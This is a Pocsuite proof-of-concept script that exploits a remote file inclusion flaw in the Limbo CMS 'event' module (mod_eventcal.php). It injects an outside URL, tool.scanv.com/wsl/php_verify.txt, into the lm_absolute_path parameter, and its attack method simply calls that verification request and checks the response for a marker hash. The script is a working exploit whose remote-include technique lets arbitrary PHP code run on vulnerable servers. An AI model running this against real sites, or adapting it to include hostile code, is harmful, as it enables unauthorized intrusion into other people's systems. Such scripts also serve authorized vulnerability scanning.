#!/usr/bin/env python
# coding: utf-8

import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class Limbo_CMS_Module_event_Remote_File_Include(POCBase):
    vulID = '64366'
    version = '1'
    vulDate = '2006-12-27'
    author = ' '
    createDate = '2015-12-19'
    updateDate = ' '
    references = ['http://www.sebug.net/vuldb/ssvid-64366']
    name = 'Limbo CMS Module event 1.0 - Remote File Include Vulnerability'
    appPowerLink = 'http://www.limbo-tr.com/images/downloads/event.zip'
    appName = 'Limbo CMS Module event'
    appVersion = '1.1'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/eventcal/mod_eventcal.php?lm_absolute_path=http://tool.scanv.com/wsl/php_verify.txt?' % self.url
        response = req.get(vul_url).content

        if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url


        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(Limbo_CMS_Module_event_Remote_File_Include)